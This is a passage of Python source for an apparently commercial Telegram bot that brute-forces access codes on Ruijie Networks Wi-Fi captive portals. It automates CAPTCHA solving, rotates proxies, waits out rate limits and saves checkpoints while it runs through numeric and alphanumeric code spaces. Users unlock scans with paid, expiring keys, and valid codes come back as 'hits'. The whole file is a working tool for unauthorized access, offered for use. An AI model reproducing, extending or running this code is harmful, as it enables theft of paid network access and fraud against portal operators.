                    continue

                auth_code = None
                for _ in range(4):
                    img_bytes = await fetch_captcha(session, session_id, proxy=proxy)
                    guess = await captcha_text(img_bytes)
                    if guess and await verify_captcha(session, session_id, guess, proxy=proxy):
                        auth_code = guess
                        break

                if not auth_code:
                    continue

                if not recheck:
                    current_task = scan_tasks.get(chat_id)
                    if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                        return None

                payload = {
                    "accessCode": code,
                    "sessionId": session_id,
                    "apiVersion": 1,
                    "authCode": auth_code,
                }
                headers = {
                    "authority": "portal-as.ruijienetworks.com",
                    "accept": "*/*",
                    "content-type": "application/json",
                    "origin": "https://portal-as.ruijienetworks.com",
                    "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
                    "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                }
                async with session.post(VOUCHER_ENDPOINT, json=payload, headers=headers, proxy=proxy) as resp:
                    response_text = await resp.text()
                    lower_resp = response_text.lower()
                    if "request limited" in lower_resp or "too many" in lower_resp:
                        await asyncio.sleep(random.uniform(1.0, 2.5) * (attempt + 1))
                        continue
                    break
            except Exception as exc:
                logger.debug("Probe retry %d error on %s: %s", attempt + 1, code, exc)
                await asyncio.sleep(0.5 * (attempt + 1))
    finally:
        if own_session:
            await session.close()

    if not response_text:
        return None

    if "logonUrl" in response_text:
        if recheck:
            return code
        expire_info = await get_code_expires_info(session, session_id or "", get_next_proxy() if use_proxy else None)
        entry = f"[HIT] {code} :: {expire_info}"
        success_texts.setdefault(chat_id, []).append(entry)
        logger.info("HIT FOUND :: code=%s meta=%s", code, expire_info)

        saved = db.get_results(str(chat_id))
        if code not in saved:
            saved.append(code)
            db.save_results(str(chat_id), saved)

        user_info = db.get_user(str(chat_id))
        if user_info:
            key_info = db.get_key(user_info["key"])
            if key_info:
                db.update_used_codes(user_info["key"], key_info["used_codes"] + 1)

        if message:
            display_slice = success_texts[chat_id][-CONFIG["max_display_items"] :]
            code_line = "\n".join(esc_html(x) for x in display_slice)
            try:
                if chat_id not in success_messages or len(code_line) > 3800:
                    sent = await bot.send_message(chat_id=message.chat.id, text=f"<code>[HITS STREAM]\n{code_line}</code>")
                    success_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=success_messages[chat_id],
                        text=f"<code>[HITS STREAM]\n{code_line}</code>",
                    )
            except Exception as exc:
                logger.warning("Hit UI update error: %s", exc)

    elif "STA" in response_text:
        limited_texts.setdefault(chat_id, []).append(code)
        if len(limited_texts[chat_id]) > CONFIG["max_display_items"]:
            limited_texts[chat_id] = limited_texts[chat_id][-CONFIG["max_display_items"] :]
        if message:
            limited_line = "\n".join(esc_html(x) for x in limited_texts[chat_id][-30:])
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id=message.chat.id, text=f"<code>[THROTTLED]\n{limited_line}</code>")
                    limited_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=limited_messages[chat_id],
                        text=f"<code>[THROTTLED]\n{limited_line}</code>",
                    )
            except Exception as exc:
                logger.debug("Throttled UI update error: %s", exc)

    return None


# ======================================================
# Generators & Scan Engine
# ======================================================
def digit_generator(length: int) -> str:
    return "".join(random.choice(string.digits) for _ in range(length))


def engsmall_generator(length: int) -> str:
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))


def engmixed_generator(length: int) -> str:
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))


def iter_codes(mode: str, start_digit: str | None = None):
    if mode in ("6", "7", "8"):
        length = int(mode)
        if start_digit is not None:
            start = int(start_digit) * (10 ** (length - 1))
            end = (int(start_digit) + 1) * (10 ** (length - 1))
            for i in range(start, end):
                yield str(i).zfill(length)
            return
        if mode == "6":
            codes = [str(i).zfill(6) for i in range(10**6)]
            random.shuffle(codes)
            yield from codes
            return
        while True:
            yield digit_generator(length)

    if mode in ("engsmall6", "engsmall7", "engsmall8"):
        length = int(mode[-1])
        while True:
            yield engsmall_generator(length)

    if mode in ("engmixed6", "engmixed7", "engmixed8"):
        length = int(mode[-1])
        while True:
            yield engmixed_generator(length)

    raise ValueError(f"Unsupported mode: {mode}")


def format_progress(mode: str, checked: int, total: int | None = None, speed: float = 0.0, found: int = 0) -> str:
    rate_str = f"{speed:,.0f} req/m"
    if total is not None and total > 0:
        pct = min(100.0, (checked / total) * 100.0)
        filled = int(pct / 5)
        bar = "#" * filled + "-" * (20 - filled)
        return (
            f"<code>[SCANNING :: {esc_html(mode.upper())}]\n"
            f"PROG  : [{bar}] {pct:5.1f}%\n"
            f"COUNT : {checked:,}/{total:,}\n"
            f"RATE  : {rate_str}\n"
            f"HITS  : {found}</code>"
        )
    return (
        f"<code>[SCANNING :: {esc_html(mode.upper())}]\n"
        f"STATE : ACTIVE\n"
        f"COUNT : {checked:,}\n"
        f"RATE  : {rate_str}\n"
        f"HITS  : {found}</code>"
    )


async def send_success_file(chat_id: int) -> None:
    items = success_texts.get(chat_id)
    if not items:
        return
    filename = f"recon_hits_{chat_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        content = "\n".join(items)
        with open(filename, "w", encoding="utf-8") as f:
            f.write(
                f"RECON HITS EXPORT\nOPERATOR_ID: {chat_id}\n"
                f"TIMESTAMP: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"TOTAL_HITS: {len(items)}\n{'-' * 44}\n{content}\n"
            )
        with open(filename, "rb") as f:
            await bot.send_document(chat_id, f, caption=f"<code>[EXPORT] {len(items)} HITS SAVED</code>")
    except Exception as exc:
        logger.error("Export error: %s", exc)
    finally:
        if os.path.exists(filename):
            os.remove(filename)


async def run_bruteforce(
    mode: str,
    chat_id: int,
    session_url: str,
    scan_id: str,
    message=None,
    progress_msg=None,
    start_digit: str | None = None,
):
    try:
        code_iter = iter_codes(mode, start_digit=start_digit)
    except ValueError as exc:
        await bot.send_message(chat_id, f"<code>[ERR] {esc_html(str(exc))}</code>")
        return

    total = (10 ** int(mode)) if mode in ("6", "7") and start_digit is None else None
    checked = 0
    last_key_check = time.monotonic()
    scan_start = time.monotonic()
    semaphore = asyncio.Semaphore(CONFIG["max_concurrent"])
    connector = aiohttp.TCPConnector(
        limit=CONFIG["connection_limit"],
        limit_per_host=CONFIG["connection_per_host"],
        ttl_dns_cache=300,
        ssl=False,
    )
    batch: list[str] = []

    try:
        async with aiohttp.ClientSession(
            connector=connector,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=CONFIG["timeout"]),
        ) as shared_session:
            while True:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id:
                    return
                if current_task.get("stop"):
                    return

                batch = []
                for _ in range(CONFIG["batch_size"]):
                    try:
                        batch.append(next(code_iter))
                    except StopIteration:
                        break
                if not batch:
                    break

                if time.monotonic() - last_key_check >= 600 and not is_admin(str(chat_id)):
                    user_info = db.get_user(str(chat_id))
                    if user_info:
                        key_info = db.get_key(user_info["key"])
                        if not key_info or not check_key_expiration(key_info["expires_at"]):
                            approve[chat_id] = False
                            paid_users.pop(str(chat_id), None)
                            await bot.send_message(chat_id, "<code>[ERR] SESSION KEY EXPIRED</code>")
                            return
                    last_key_check = time.monotonic()

                db.save_checkpoint(str(chat_id), mode, batch[-1], start_digit)

                async def _worker(c: str):
                    async with semaphore:
                        return await perform_check(
                            session_url,
                            c,
                            chat_id,
                            scan_id=scan_id,
                            message=message,
                            shared_session=shared_session,
                        )

                await asyncio.gather(*[_worker(c) for c in batch], return_exceptions=True)
                checked += len(batch)

                found = len(success_texts.get(chat_id, []))
                elapsed = max(0.001, time.monotonic() - scan_start)
                speed = (checked / elapsed) * 60.0
                progress_text = format_progress(mode, checked, total, speed, found)

                if progress_msg:
                    try:
                        await bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=progress_msg.message_id,
                            text=progress_text,
                        )
                    except Exception:
                        pass

        found = len(success_texts.get(chat_id, []))
        finish_text = (
            f"<code>[SCAN COMPLETE :: {esc_html(mode.upper())}]\n"
            f"COUNT : {checked:,}" + (f"/{total:,}" if total else "") +
            f"\nHITS  : {found}\nSTATUS: FINISHED</code>"
        )
        if progress_msg:
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
            except Exception:
                await bot.send_message(chat_id, finish_text)
        await send_success_file(chat_id)
        db.clear_checkpoint(str(chat_id))

    except asyncio.CancelledError:
        if batch:
            db.save_checkpoint(str(chat_id), mode, batch[-1], start_digit)
        await send_success_file(chat_id)
        raise
    finally:
        await connector.close()
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)


# ======================================================
# Additional Commands & Callbacks
# ======================================================
@bot.message_handler(commands=["scan"])
async def handle_scan(message):
    chat_id = message.chat.id
    user_id = str(chat_id)
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "<code>[SELECT SCAN MODE]\n6, 7, 8, engsmall6..8, engmixed6..8</code>",
            reply_markup=get_voucher_keyboard(),
        )
        return
    mode = args[1].strip()
    if not is_authorized(chat_id):
        await bot.reply_to(message, "<code>[ERR] UNAUTHORIZED</code>")
        return
    if "session_url" not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "<code>[ERR] SET TARGET FIRST :: /portal &lt;url&gt;</code>")
        return
    active = scan_tasks.get(chat_id)
    if active and not active["task"].done():
        await bot.reply_to(message, "<code>[WRN] SCAN ALREADY RUNNING</code>")
        return

    progress_msg = await bot.send_message(chat_id, f"<code>[INIT SCAN :: {esc_html(mode.upper())}]</code>")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(mode, chat_id, user_data[chat_id]["session_url"], scan_id, message=message, progress_msg=progress_msg)
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
    await forward_to_channel(f"SCAN_START :: uid={user_id} mode={mode}")


@bot.message_handler(commands=["stop"])
async def stop_scan_command(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        await send_success_file(chat_id)
        data["task"].cancel()
        await bot.reply_to(message, "<code>[OK] SCAN ABORTED</code>", reply_markup=get_back_keyboard())
    else:
        await bot.reply_to(message, "<code>[INFO] NO ACTIVE SCAN</code>", reply_markup=get_back_keyboard())


@bot.message_handler(commands=["result"])
async def handle_result(message):
    chat_id = message.chat.id
    if not is_authorized(chat_id):
        await bot.reply_to(message, "<code>[ERR] UNAUTHORIZED</code>")
        return
    results = db.get_results(str(chat_id))
    if results:
        lines = "\n".join(esc_html(x) for x in results[-100:])
        await bot.reply_to(message, f"<code>[SAVED HITS]\n{lines}</code>")
    else:
        await bot.reply_to(message, "<code>[INFO] NO SAVED HITS</code>")


@bot.message_handler(commands=["recheck"])
async def recheck_command(message):
    chat_id = message.chat.id
    if not is_authorized(chat_id):
        await bot.reply_to(message, "<code>[ERR] UNAUTHORIZED</code>")
        return
    results = db.get_results(str(chat_id))
    if not results:
        await bot.reply_to(message, "<code>[INFO] NO HITS TO VERIFY</code>")
        return
    session_url = user_data.get(chat_id, {}).get("session_url")
    if not session_url:
        await bot.reply_to(message, "<code>[ERR] SET TARGET FIRST :: /portal &lt;url&gt;</code>")
        return

    await bot.reply_to(message, f"<code>[VERIFY] CHECKING {len(results)} CODES...</code>")
    valid_codes: list[str] = []
    async with aiohttp.ClientSession(
        cookie_jar=aiohttp.CookieJar(),
        timeout=aiohttp.ClientTimeout(total=CONFIG["timeout"]),
    ) as session:
        for code in results:
            found_code = await perform_check(session_url, code, chat_id, recheck=True, message=message, shared_session=session)
            if found_code:
                valid_codes.append(found_code)

    if valid_codes:
        db.save_results(str(chat_id), valid_codes)
        await bot.reply_to(message, "<code>[LIVE HITS]\n" + "\n".join(esc_html(x) for x in valid_codes) + "</code>")
    else:
        await bot.reply_to(message, "<code>[DONE] NO LIVE HITS FOUND</code>")


@bot.message_handler(commands=["proxy"])
async def proxy_command(message):
    chat_id = message.chat.id
    user_id = str(chat_id)
    if not is_authorized(chat_id):
        await bot.reply_to(message, "<code>[ERR] UNAUTHORIZED</code>")
        return
    new_status = not db.get_proxy_setting(user_id)
    db.set_proxy_setting(user_id, new_status)
    await bot.reply_to(message, f"<code>[PROXY] {'ENABLED' if new_status else 'DISABLED'}</code>")


async def listkeys_command(message):
    keys = db.get_all_keys()
    if not keys:
        await bot.reply_to(message, "<code>[INFO] NO KEYS IN DB</code>")
        return
    lines = []
    for k, item in keys.items():
        u = db.get_user_by_key(k)
        uid = u["user_id"] if u else "NONE"
        exp = "INF" if item["expires_at"] == "9999-12-31T23:59:59Z" else item["expires_at"][:10]
        lines.append(f"{esc_html(k)} | uid={esc_html(uid)} | plan={esc_html(item['plan'])} | exp={esc_html(exp)}")
    text = "<code>[KEYS TABLE]\n" + "\n".join(lines) + "</code>"
    for i in range(0, len(text), 4000):
        await bot.send_message(message.chat.id, text[i : i + 4000])


async def stats_command(message):
    keys = db.get_all_keys()
    users = db.get_all_users()
    active_scans = sum(1 for d in scan_tasks.values() if not d["task"].done())
    uptime = int(time.monotonic() - _start_time)
    hh, rem = divmod(uptime, 3600)
    mm, ss = divmod(rem, 60)
    await bot.reply_to(
        message,
        "<code>┌──────────────────────────────────┐\n"
        "│  ◈ SYSTEM TELEMETRY              │\n"
        "└──────────────────────────────────┘\n"
        f"UPTIME  : {hh:02d}:{mm:02d}:{ss:02d}\n"
        f"SCANS   : {active_scans}\n"
        f"KEYS    : {len(keys)}\n"
        f"USERS   : {len(users)}\n"
        f"THREADS : {CONFIG['max_concurrent']}</code>",
    )


async def users_list_command(message):
    users = db.get_all_users()
    if not users:
        await bot.reply_to(message, "<code>[INFO] NO REGISTERED USERS</code>")
        return
    await bot.reply_to(message, "<code>[REGISTERED UIDS]\n" + "\n".join(esc_html(u) for u in users) + "</code>")


@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = str(chat_id)
    user_name = call.from_user.first_name or call.from_user.username or "Operator"
    data = call.data

    if data.startswith("admin_"):
        if not is_admin(user_id):
            await bot.answer_callback_query(call.id, "ACCESS DENIED")
            return
        if data == "admin_back":
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="<code>[ROOT PANEL]\nSelect operation:</code>",
                reply_markup=get_admin_main_keyboard(),
            )
        elif data == "admin_genkey":
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="<code>[GENKEY :: SELECT TTL PLAN]</code>",
                reply_markup=get_admin_genkey_keyboard(),
            )
        elif data.startswith("admin_gen_"):
            plan = data.replace("admin_gen_", "")
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"<code>PLAN :: {esc_html(plan)}\nCMD  :: /genkey {esc_html(plan)} &lt;limit&gt; &lt;user_id&gt;</code>",
                reply_markup=get_admin_back_keyboard(),
            )
        elif data == "admin_delkey":
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="<code>CMD :: /delkey &lt;key&gt;</code>",
                reply_markup=get_admin_back_keyboard(),
            )
        elif data == "admin_listkeys":
            await listkeys_command(call.message)
        elif data == "admin_stats":
            await stats_command(call.message)
        elif data == "admin_broadcast":
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="<code>CMD :: /sendall &lt;message&gt;</code>",
                reply_markup=get_admin_back_keyboard(),
            )
        elif data == "admin_users":
            await users_list_command(call.message)
        await bot.answer_callback_query(call.id)
        return

    if data in ("menu_proxy_on", "menu_proxy_off"):
        if not is_authorized(chat_id):
            await bot.answer_callback_query(call.id, "UNAUTHORIZED")
            return
        new_status = not db.get_proxy_setting(user_id)
        db.set_proxy_setting(user_id, new_status)
        card = format_dashboard_card(user_name, user_id, is_authorized(chat_id), new_status)
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=card,
            reply_markup=get_main_keyboard(user_id),
        )
        await bot.answer_callback_query(call.id, f"PROXY: {'ON' if new_status else 'OFF'}")
        return

    if data == "menu_back":
        card = format_dashboard_card(user_name, user_id, is_authorized(chat_id), db.get_proxy_setting(user_id))
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=card,
            reply_markup=get_main_keyboard(user_id),
        )
        await bot.answer_callback_query(call.id)
        return

    if data == "menu_free_trial":
        if not is_authorized(chat_id):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"<code>[ERR] UNAUTHORIZED :: CONTACT @{esc_html(CONFIG['admin_name'])}</code>",
                reply_markup=get_back_keyboard(),
            )
            await bot.answer_callback_query(call.id)
            return
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="<code>CMD :: /portal &lt;target_portal_url&gt;</code>",
            reply_markup=get_back_keyboard(),
        )
        await bot.answer_callback_query(call.id)
        return

    if data == "menu_paid":
        if is_admin(user_id):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="<code>[OK] ROOT PRIVILEGES ACTIVE</code>",
                reply_markup=get_back_keyboard(),
            )
        else:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"<code>UID :: {esc_html(user_id)}\nCMD :: /key &lt;your_key&gt;</code>",
                reply_markup=get_paid_keyboard(),
            )
        await bot.answer_callback_query(call.id)
        return

    if data == "menu_enter_key":
        await bot.send_message(chat_id, f"<code>UID :: {esc_html(user_id)}\nCMD :: /key &lt;your_key_here&gt;</code>")
        await bot.answer_callback_query(call.id)
        return

    if data == "menu_result":
        if not is_authorized(chat_id):
            await bot.answer_callback_query(call.id, "UNAUTHORIZED")
            return
        res = db.get_results(user_id)
        txt = "<code>[HITS]\n" + "\n".join(esc_html(x) for x in res[-100:]) + "</code>" if res else "<code>[INFO] NO HITS RECORDED</code>"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=txt, reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if data == "menu_recheck":
        await recheck_command(call.message)
        await bot.answer_callback_query(call.id)
        return

    if data == "menu_stop":
        await stop_scan_command(call.message)
        await bot.answer_callback_query(call.id, "ABORTED")
        return

    if data == "menu_start_scam":
        if not is_authorized(chat_id):
            await bot.answer_callback_query(call.id, "UNAUTHORIZED")
            return
        u_state = user_data.get(chat_id, {})
        if "selected_mode" not in u_state:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="<code>[SELECT MODE]</code>",
                reply_markup=get_voucher_keyboard(),
            )
            await bot.answer_callback_query(call.id)
            return
        if "session_url" not in u_state:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="<code>[ERR] SET TARGET FIRST :: /portal &lt;url&gt;</code>",
                reply_markup=get_back_keyboard(),
            )
            await bot.answer_callback_query(call.id)
            return
        active = scan_tasks.get(chat_id)
        if active and not active["task"].done():
            await bot.answer_callback_query(call.id, "ALREADY RUNNING")
            return
        mode = u_state["selected_mode"]
        start_digit = u_state.get("start_digit")
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"<code>[LAUNCHED] MODE={esc_html(mode)}</code>",
            reply_markup=get_scam_button_keyboard(),
        )
        progress_msg = await bot.send_message(chat_id, f"<code>[INIT SCAN :: {esc_html(mode.upper())}]</code>")
        scan_id = str(uuid.uuid4())
        task = asyncio.create_task(
            run_bruteforce(
                mode,
                chat_id,
                u_state["session_url"],
                scan_id,
                message=call.message,
                progress_msg=progress_msg,
                start_digit=start_digit,
            )
        )
        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
        await bot.answer_callback_query(call.id)
        return

    if data.startswith("scan_"):
        if not is_authorized(chat_id):
            await bot.answer_callback_query(call.id, "UNAUTHORIZED")
            return
        mode = data.replace("scan_", "")
        user_data.setdefault(chat_id, {})
        if "session_url" not in user_data[chat_id]:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="<code>[ERR] SET TARGET FIRST :: /portal &lt;url&gt;</code>",
                reply_markup=get_back_keyboard(),
            )
            await bot.answer_callback_query(call.id)
            return
        if mode in ("6", "7", "8"):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"<code>[PREFIX SELECT :: NUM-{esc_html(mode)}]</code>",
                reply_markup=get_digit_keyboard(mode),
            )
            await bot.answer_callback_query(call.id)
            return
        user_data[chat_id]["selected_mode"] = mode
        user_data[chat_id]["start_digit"] = None
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"<code>MODE :: {esc_html(mode)}\nREADY TO LAUNCH</code>",
            reply_markup=get_start_scam_keyboard(),
        )
        await bot.answer_callback_query(call.id)
        return

    if data.startswith("digit_"):
        _, mode, digit = data.split("_", 2)
        user_data.setdefault(chat_id, {})
        user_data[chat_id]["selected_mode"] = mode
        user_data[chat_id]["start_digit"] = None if digit == "random" else digit
        prefix_label = "RANDOM" if digit == "random" else f"{digit}*"
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"<code>MODE   :: {esc_html(mode)}\nPREFIX :: {esc_html(prefix_label)}\nREADY TO LAUNCH</code>",
            reply_markup=get_start_scam_keyboard(),
        )
        await bot.answer_callback_query(call.id)


# ======================================================
# Health Server & Lifecycle
# ======================================================
async def health_handler(request: web.Request) -> web.Response:
    return web.Response(text="OK")


async def start_web_server() -> web.AppRunner:
    app = web.Application()
    app.router.add_get("/", health_handler)
    app.router.add_get("/health", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", CONFIG["port"])
    await site.start()
    logger.info("HTTP listener bound on 0.0.0.0:%s", CONFIG["port"])
    return runner


async def polling_loop(stop_event: asyncio.Event) -> None:
    backoff = 5
    while not stop_event.is_set():
        try:
            await bot.infinity_polling(timeout=60, request_timeout=60, skip_pending=True)
            backoff = 5
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            logger.error("Poll fault: %s | retry=%ss", exc, backoff)
            try:
                await asyncio.wait_for(stop_event.wait(), timeout=backoff)
            except asyncio.TimeoutError:
                pass
            backoff = min(backoff * 2, 60)


async def main() -> None:
    stop_event = asyncio.Event()
    loop = asyncio.get_running_loop()

    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, stop_event.set)
        except NotImplementedError:
            pass

    runner = await start_web_server()
    poll_task = asyncio.create_task(polling_loop(stop_event))

    try:
        await stop_event.wait()
    finally:
        poll_task.cancel()
        for task_info in list(scan_tasks.values()):
            task_info["stop"] = True
            if not task_info["task"].done():
                task_info["task"].cancel()
        await asyncio.gather(poll_task, return_exceptions=True)
        await runner.cleanup()
        db.close()
        logger.info("Console shutdown complete.")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Interrupted by operator.")
